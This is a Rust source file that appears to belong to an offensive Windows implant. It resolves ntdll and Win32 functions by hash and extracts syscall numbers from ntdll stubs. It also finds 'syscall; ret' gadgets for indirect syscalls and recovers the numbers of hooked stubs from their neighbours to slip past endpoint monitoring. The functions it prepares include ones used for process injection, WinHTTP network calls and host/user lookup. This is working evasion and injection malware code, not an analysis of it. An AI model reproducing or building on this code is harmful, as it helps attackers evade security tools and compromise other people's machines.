use crate::core::types::{HANDLE, SyscallEntry};
use crate::core::{hashes, resolver};

use core::cell::UnsafeCell;
use core::ffi::c_void;
use core::ptr::null_mut;

const RET_OPCODE: u8 = 0xC3;
const SYSCALL_SEARCH_RANGE: isize = 32;
const NEIGHBOUR_SEARCH_LIMIT: u32 = 500;

#[cfg(target_arch = "x86_64")]
mod arch {
    // x64 Nt* stub pattern: 4C 8B D1 B8 xx xx 00 00 (mov r10,rcx; mov eax,SSN)
    pub const MOV_R10_RCX_MOV_EAX: [u8; 4] = [0x4C, 0x8B, 0xD1, 0xB8];
    pub const SSN_LOW_OFFSET: isize = 4;
    pub const SSN_HIGH_OFFSET: isize = 5;
    pub const STUB_SIZE: u32 = 0x12;
}

/**
 * Struct to hold SSN + syscall addresses per funcion
 * Each entry store both SSN and the address of the syscall;ret gadget from that function's
 * own ntdll stub, there is no shared syscall address.
 * */
#[repr(C)]
pub struct SyscallSsns {
    pub(crate) nt_open_process: SyscallEntry,
    pub(crate) nt_allocate_virtual_memory: SyscallEntry,
    pub(crate) nt_write_virtual_memory: SyscallEntry,
    pub(crate) nt_protect_virtual_memory: SyscallEntry,
    pub(crate) nt_close: SyscallEntry,
    pub(crate) nt_create_thread_ex: SyscallEntry,
    pub(crate) nt_wait_for_single_object: SyscallEntry,
    pub(crate) nt_queue_apc_thread: SyscallEntry,
    pub(crate) nt_resume_thread: SyscallEntry,
    pub(crate) nt_create_file: SyscallEntry,
    pub(crate) nt_write_file: SyscallEntry,
    pub(crate) nt_read_file: SyscallEntry,
    pub(crate) nt_set_information_file: SyscallEntry,
    pub(crate) nt_create_section: SyscallEntry,
    pub(crate) nt_create_process_ex: SyscallEntry,
    pub(crate) nt_query_information_process: SyscallEntry,
    pub(crate) nt_read_virtual_memory: SyscallEntry,
    pub(crate) nt_query_system_information: SyscallEntry,
    pub(crate) nt_terminate_process: SyscallEntry,
    pub(crate) nt_duplicate_object: SyscallEntry,
    pub(crate) nt_set_io_completion: SyscallEntry,
    pub(crate) nt_query_information_worker_factory: SyscallEntry,
    pub(crate) nt_get_context_thread: SyscallEntry,
    pub(crate) nt_set_context_thread: SyscallEntry,
    pub(crate) nt_map_view_of_section: SyscallEntry,
    pub(crate) nt_unmap_view_of_section: SyscallEntry,
    pub(crate) nt_open_process_token: SyscallEntry,
    pub(crate) nt_query_information_token: SyscallEntry,
    pub(crate) nt_delay_execution: SyscallEntry,
}

/**
 * Struct to hold pointers to dynamically resolved Win32 and Rtl functions
 * */
#[repr(C)]
pub struct Win32Funcs {
    pub(crate) ldr_load_dll: *mut c_void,
    pub(crate) rtl_get_version: *mut c_void,
    pub(crate) rtl_init_unicode_string: *mut c_void,
    pub(crate) tp_alloc_work: *mut c_void,
    pub(crate) tp_post_work: *mut c_void,
    pub(crate) tp_release_work: *mut c_void,
    pub(crate) create_process_w: *mut c_void,
    pub(crate) rtl_create_process_parameters_ex: *mut c_void,
    pub(crate) rtl_destroy_process_parameters: *mut c_void,
    pub(crate) csr_client_connect_to_server: *mut c_void,
    pub(crate) csr_client_call_server: *mut c_void,
    pub(crate) csr_new_thread: *mut c_void,
    pub(crate) rtl_add_vectored_exception_handler: *mut c_void,
    pub(crate) winhttp_open: *mut c_void,
    pub(crate) winhttp_connect: *mut c_void,
    pub(crate) winhttp_open_request: *mut c_void,
    pub(crate) winhttp_send_request: *mut c_void,
    pub(crate) winhttp_receive_response: *mut c_void,
    pub(crate) winhttp_read_data: *mut c_void,
    pub(crate) winhttp_set_option: *mut c_void,
    pub(crate) winhttp_close_handle: *mut c_void,
    pub(crate) winhttp_query_data_available: *mut c_void,
    pub(crate) winhttp_add_request_headers: *mut c_void,
    pub(crate) get_computer_name_ex_w: *mut c_void,
    pub(crate) get_user_name_w: *mut c_void,
}

/**
 * Struct that contains handles to dynamically resolved modules
 * */
#[repr(C)]
pub struct ModuleHandles {
    pub(crate) ntdll: HANDLE,
    pub(crate) kernel32: HANDLE,
    pub(crate) winhttp: HANDLE,
    pub(crate) advapi32: HANDLE,
}

/**
 * Struct to hold all syscall related information (SSN, module handels, function pointers)
 * */
#[repr(C)]
pub struct SyscallInfo {
    pub ssns: SyscallSsns,
    pub win32: Win32Funcs,
    pub modules: ModuleHandles,
}

// Wrapper to make SyscallInfo usable in a static.
// Safety: initialized once then read only. *single threaded*
struct SyscallCell(UnsafeCell<SyscallInfo>);
unsafe impl Sync for SyscallCell {}

static NATIVE: SyscallCell = SyscallCell(UnsafeCell::new(SyscallInfo {
    ssns: SyscallSsns {
        nt_open_process: SyscallEntry::empty(),
        nt_close: SyscallEntry::empty(),
        nt_allocate_virtual_memory: SyscallEntry::empty(),
        nt_write_virtual_memory: SyscallEntry::empty(),
        nt_protect_virtual_memory: SyscallEntry::empty(),
        nt_create_thread_ex: SyscallEntry::empty(),
        nt_wait_for_single_object: SyscallEntry::empty(),
        nt_queue_apc_thread: SyscallEntry::empty(),
        nt_resume_thread: SyscallEntry::empty(),
        nt_create_file: SyscallEntry::empty(),
        nt_write_file: SyscallEntry::empty(),
        nt_read_file: SyscallEntry::empty(),
        nt_set_information_file: SyscallEntry::empty(),
        nt_create_section: SyscallEntry::empty(),
        nt_create_process_ex: SyscallEntry::empty(),
        nt_query_information_process: SyscallEntry::empty(),
        nt_read_virtual_memory: SyscallEntry::empty(),
        nt_query_system_information: SyscallEntry::empty(),
        nt_terminate_process: SyscallEntry::empty(),
        nt_duplicate_object: SyscallEntry::empty(),
        nt_set_io_completion: SyscallEntry::empty(),
        nt_query_information_worker_factory: SyscallEntry::empty(),
        nt_get_context_thread: SyscallEntry::empty(),
        nt_set_context_thread: SyscallEntry::empty(),
        nt_map_view_of_section: SyscallEntry::empty(),
        nt_unmap_view_of_section: SyscallEntry::empty(),
        nt_open_process_token: SyscallEntry::empty(),
        nt_query_information_token: SyscallEntry::empty(),
        nt_delay_execution: SyscallEntry::empty(),
    },
    win32: Win32Funcs {
        ldr_load_dll: core::ptr::null_mut(),
        rtl_get_version: core::ptr::null_mut(),
        rtl_init_unicode_string: core::ptr::null_mut(),
        tp_alloc_work: core::ptr::null_mut(),
        tp_post_work: core::ptr::null_mut(),
        tp_release_work: core::ptr::null_mut(),
        create_process_w: core::ptr::null_mut(),
        rtl_create_process_parameters_ex: core::ptr::null_mut(),
        rtl_destroy_process_parameters: core::ptr::null_mut(),
        csr_client_connect_to_server: core::ptr::null_mut(),
        csr_client_call_server: core::ptr::null_mut(),
        csr_new_thread: core::ptr::null_mut(),
        rtl_add_vectored_exception_handler: core::ptr::null_mut(),
        winhttp_open: core::ptr::null_mut(),
        winhttp_connect: core::ptr::null_mut(),
        winhttp_open_request: core::ptr::null_mut(),
        winhttp_send_request: core::ptr::null_mut(),
        winhttp_receive_response: core::ptr::null_mut(),
        winhttp_read_data: core::ptr::null_mut(),
        winhttp_set_option: core::ptr::null_mut(),
        winhttp_close_handle: core::ptr::null_mut(),
        winhttp_query_data_available: core::ptr::null_mut(),
        winhttp_add_request_headers: core::ptr::null_mut(),
        get_computer_name_ex_w: core::ptr::null_mut(),
        get_user_name_w: core::ptr::null_mut(),
    },
    modules: ModuleHandles {
        ntdll: core::ptr::null_mut(),
        kernel32: core::ptr::null_mut(),
        winhttp: core::ptr::null_mut(),
        advapi32: core::ptr::null_mut(),
    },
}));

/**
 * Initialize the syscall table by dynamically resolving SSNs functions pointers
 * */
pub unsafe fn initialize_syscalls(mut ntdll: *mut c_void) -> bool {
    unsafe {
        let state = &mut *NATIVE.0.get();

        if ntdll.is_null() {
            ntdll = resolver::ldr_module_search(hashes::NTDLL_HASH);
            if ntdll.is_null() {
                return false;
            }
        }
        state.modules.ntdll = ntdll;

        // Per function SSN + syscall address resolution macro
        macro_rules! resolve_ssn {
            ($field:ident, $hash:expr) => {
                let address = resolver::ldr_function_by_hash(ntdll, $hash);
                if !address.is_null() {
                    let entry = &mut state.ssns.$field;
                    extract_syscall_info(
                        address,
                        true,
                        Some(&mut entry.ssn),
                        Some(&mut entry.syscall_addr),
                    );
                }
            };
        }

        // Resolve each syscall, both SSN and pre function syscall address
        resolve_ssn!(nt_open_process, hashes::NTOPENPROCESS_HASH);
        resolve_ssn!(
            nt_allocate_virtual_memory,
            hashes::NTALLOCATEVIRTUALMEMORY_HASH
        );
        resolve_ssn!(nt_write_virtual_memory, hashes::NTWRITEVIRTUALMEMORY_HASH);
        resolve_ssn!(
            nt_protect_virtual_memory,
            hashes::NTPROTECTVIRTUALMEMORY_HASH
        );
        resolve_ssn!(nt_create_thread_ex, hashes::NTCREATETHREADEX_HASH);
        resolve_ssn!(nt_close, hashes::NTCLOSE_HASH);
        resolve_ssn!(
            nt_wait_for_single_object,
            hashes::NTWAITFORSINGLEOBJECT_HASH
        );
        resolve_ssn!(nt_queue_apc_thread, hashes::NTQUEUEAPCTHREAD_HASH);
        resolve_ssn!(nt_resume_thread, hashes::NTRESUMETHREAD_HASH);
        resolve_ssn!(nt_create_file, hashes::NTCREATEFILE_HASH);
        resolve_ssn!(nt_write_file, hashes::NTWRITEFILE_HASH);
        resolve_ssn!(nt_read_file, hashes::NTREADFILE_HASH);
        resolve_ssn!(nt_set_information_file, hashes::NTSETINFORMATIONFILE_HASH);
        resolve_ssn!(nt_create_section, hashes::NTCREATESECTION_HASH);
        resolve_ssn!(nt_create_process_ex, hashes::NTCREATEPROCESSEX_HASH);
        resolve_ssn!(
            nt_query_information_process,
            hashes::NTQUERYINFORMATIONPROCESS_HASH
        );
        resolve_ssn!(nt_read_virtual_memory, hashes::NTREADVIRTUALMEMORY_HASH);
        resolve_ssn!(
            nt_query_system_information,
            hashes::NTQUERYSYSTEMINFORMATION_HASH
        );
        resolve_ssn!(nt_terminate_process, hashes::NTTERMINATEPROCESS_HASH);
        resolve_ssn!(nt_duplicate_object, hashes::NTDUPLICATEOBJECT_HASH);
        resolve_ssn!(nt_set_io_completion, hashes::NTSETIOCOMPLETION_HASH);
        resolve_ssn!(
            nt_query_information_worker_factory,
            hashes::NTQUERYINFORMATIONWORKERFACTORY_HASH
        );
        resolve_ssn!(nt_get_context_thread, hashes::NTGETCONTEXTTHREAD_HASH);
        resolve_ssn!(nt_set_context_thread, hashes::NTSETCONTEXTTHREAD_HASH);
        resolve_ssn!(nt_map_view_of_section, hashes::NTMAPVIEWOFSECTION_HASH);
        resolve_ssn!(nt_unmap_view_of_section, hashes::NTUNMAPVIEWOFSECTION_HASH);
        resolve_ssn!(nt_open_process_token, hashes::NTOPENPROCESSTOKEN_HASH);
        resolve_ssn!(
            nt_query_information_token,
            hashes::NTQUERYINFORMATIONTOKEN_HASH
        );
        resolve_ssn!(nt_delay_execution, hashes::NTDELAYEXECUTION_HASH);

        // Win32 / Rtl function pinters, resolved in a single export table pass.
        // Uses raw pointer to teh state to create field pointers without &mut aliasing
        {
            let p = NATIVE.0.get(); // *mut SyscallInfo - raw, no borrow
            let mut batch: [(u32, *mut *mut c_void); 12] = [
                (
                    hashes::LDRLOADDLL_HASH,
                    core::ptr::addr_of_mut!((*p).win32.ldr_load_dll),
                ),
                (
                    hashes::RTLGETVERSION_HASH,
                    core::ptr::addr_of_mut!((*p).win32.rtl_get_version),
                ),
                (
                    hashes::RTLINITUNICODESTRING_HASH,
                    core::ptr::addr_of_mut!((*p).win32.rtl_init_unicode_string),
                ),
                (
                    hashes::TPALLOCWORK_HASH,
                    core::ptr::addr_of_mut!((*p).win32.tp_alloc_work),
                ),
                (
                    hashes::TPPOSTWORK_HASH,
                    core::ptr::addr_of_mut!((*p).win32.tp_post_work),
                ),
                (
                    hashes::TPRELEASEWORK_HASH,
                    core::ptr::addr_of_mut!((*p).win32.tp_release_work),
                ),
                (
                    hashes::RTLCREATEPROCESSPARAMETERSEX_HASH,
                    core::ptr::addr_of_mut!((*p).win32.rtl_create_process_parameters_ex),
                ),
                (
                    hashes::RTLDESTROYPROCESSPARAMETERS_HASH,
                    core::ptr::addr_of_mut!((*p).win32.rtl_destroy_process_parameters),
                ),
                (
                    hashes::CSRCLIENTCONNECTTOSERVER_HASH,
                    core::ptr::addr_of_mut!((*p).win32.csr_client_connect_to_server),
                ),
                (
                    hashes::CSRCLIENTCALLSERVER_HASH,
                    core::ptr::addr_of_mut!((*p).win32.csr_client_call_server),
                ),
                (
                    hashes::CSRNEWTHREAD_HASH,
                    core::ptr::addr_of_mut!((*p).win32.csr_new_thread),
                ),
                (
                    hashes::RTLADDVECTOREDEXCEPTIONHANDLER_HASH,
                    core::ptr::addr_of_mut!((*p).win32.rtl_add_vectored_exception_handler),
                ),
            ];

            resolver::resolve_exports_batch(ntdll, &mut batch);
        }

        state.modules.kernel32 = resolver::ldr_module_search(hashes::KERNEL32_HASH);

        state.win32.get_computer_name_ex_w = resolver::ldr_function_by_hash(state.modules.kernel32, hashes::GETCOMPUTERNAMEEXW_HASH);

        state.ssns.nt_close.ssn != 0 && !state.ssns.nt_close.syscall_addr.is_null()
    }
}

/**
 * Extracts the SSN and syscall instruction address from NTAPI stub
 * */
unsafe fn extract_syscall_info(
    function: *mut c_void,
    resolve_hooked: bool,
    mut ssn: Option<&mut u16>,
    syscall_address: Option<&mut *mut c_void>,
) -> bool {
    unsafe {
        if function.is_null() {
            return false;
        }
        if ssn.is_none() && syscall_address.is_none() {
            return false;
        }

        let mut offset: isize = 0;
        let mut success = false;

        loop {
            if *(function as *const u8).offset(offset) == RET_OPCODE {
                break;
            }

            #[cfg(target_arch = "x86_64")]
            {
                if *(function as *const [u8; 4]).offset(offset) == arch::MOV_R10_RCX_MOV_EAX {
                    if let Some(ssn_value) = ssn.as_deref_mut() {
                        let low = *(function as *const u8).offset(offset + arch::SSN_LOW_OFFSET);
                        let high = *(function as *const u8).offset(offset + arch::SSN_HIGH_OFFSET);
                        *ssn_value = (high as u16) << 8 | low as u16;
                        success = true;
                    }

                    if let Some(addr_out) = syscall_address {
                        *addr_out = null_mut();
                        for i in 0..SYSCALL_SEARCH_RANGE {
                            let candidate = (function as *const u8).offset(offset + i);
                            if *candidate == 0x0F
                                && *candidate.offset(1) == 0x05
                                && *candidate.offset(2) == RET_OPCODE
                            {
                                *addr_out = candidate as *mut c_void;
                                success = true;
                                break;
                            }
                        }
                    }
                    break;
                }
            }

            offset += 1;
        }

        if !success && ssn.is_some() && resolve_hooked {
            success = find_hooked_syscall_ssn(function, ssn.unwrap());
        }

        success
    }
}

/**
 * Attepts to find the correct SSN for a hooked syscall by inspecting neighboring stubs for valid syscall patterns
 * */
unsafe fn find_hooked_syscall_ssn(function: *mut c_void, ssn: &mut u16) -> bool {
    unsafe {
        let stub_size = arch::STUB_SIZE;
        if stub_size == 0 {
            return false;
        }

        for i in 1..NEIGHBOUR_SEARCH_LIMIT {
            let neighbour = (function as usize + stub_size as usize * i as usize) as *mut c_void;
            let mut neighbour_ssn: u16 = 0;
            if extract_syscall_info(neighbour, false, Some(&mut neighbour_ssn), None) {
                *ssn = neighbour_ssn.wrapping_sub(i as u16);
                return true;
            }

            let neighbour =
                (function as usize).wrapping_sub(stub_size as usize * i as usize) as *mut c_void;
            let mut neighbour_ssn: u16 = 0;
            if extract_syscall_info(neighbour, false, Some(&mut neighbour_ssn), None) {
                *ssn = neighbour_ssn.wrapping_add(i as u16);
                return true;
            }
        }

        false
    }
}

/**
 * Returns a reference to the initialized syscall table
 * */
pub unsafe fn syscall_table() -> &'static SyscallInfo {
    unsafe { &*NATIVE.0.get() }
}
